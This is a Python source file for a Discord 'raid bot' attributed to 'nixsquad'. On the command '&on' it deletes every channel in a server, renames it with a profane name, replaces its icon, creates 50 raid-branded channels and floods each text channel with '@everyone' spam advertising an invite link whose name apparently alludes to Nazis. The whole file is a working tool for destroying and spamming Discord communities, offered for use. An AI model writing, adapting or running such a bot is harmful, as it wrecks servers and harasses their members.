import discord
from discord.ext import commands
import time
from colorama import Fore, init
from asyncio import create_task, gather
init()

Nix = discord.Client(intents=discord.Intents.all())
Nix = commands.Bot(
    description="Nix Raid Bot CODE BY NSNT",
    command_prefix="&",
    help_command=None,
    intents=discord.Intents.all()
)

exclude = ["1139432468655656960"]
token = "BOT TOKEN"

config_bot = {
    'channel_names': "raid by nixsquad",
    'spam': "@everyone #hailnsnt discord.gg/nixakanazis",
    'server_logo': "https://cdn.discordapp.com/icons/1139432468655656960/a_9b152d9ad3e23e845d4efb123acbd032.gif?size=2048",
    'server_name': "THE MOTHERFUCKING NIXSQUAD"
}


def Init():
    try:
        Nix.run(token, reconnect=True)
    except discord.errors.LoginFailure:
        print("No se pudo iniciar sesion en el bot.")

def Event(msg):
    hour = time.strftime("%H:%M:%S")
    print(f"{Fore.GREEN}[{Fore.RED}{hour}{Fore.GREEN}] {Fore.RED}{msg}")

@Nix.event
async def on_connect():
    stream = discord.Streaming(
        name="nix squad on top",
        url="https://twitch.tv/nsntontop", 
    )
    await Nix.change_presence(activity=stream)    
    print(f"{Fore.GREEN}Bot logged in {Fore.RED}{Nix.user.display_name}{Fore.BLUE}({Nix.user.id})") 

@Nix.command()
async def on(ctx):
    await ctx.message.delete()
    if ctx.guild.id in exclude:
        return
    else:
        try:
            await ctx.guild.edit(icon=config_bot['server_logo'])
            await ctx.guild.edit(name=config_bot['server_name'])
        except:
            pass
        for channel in ctx.guild.channels:
            try:
                task = create_task(channel.delete())

                await gather(task)
                Event("channel -> deleted successfully")
            except:
                Event("channel -> was not deleted by an error")
                pass
        for _ in range(50):
            try:
                await ctx.guild.create_text_channel(config_bot['channel_names'])
                Event("channel -> created successfully")
            except:
                pass

        try:
            tasks = []

            for _ in range(5):
                for x in range(15):
                    for channel in ctx.guild.channels:
                        if isinstance(channel, discord.TextChannel):
                            task = create_task(channel.send(config_bot['spam']))
                            tasks.append(task)
            await gather(*tasks)
        except:
            pass

       
                

if __name__ == "__main__":
    Init()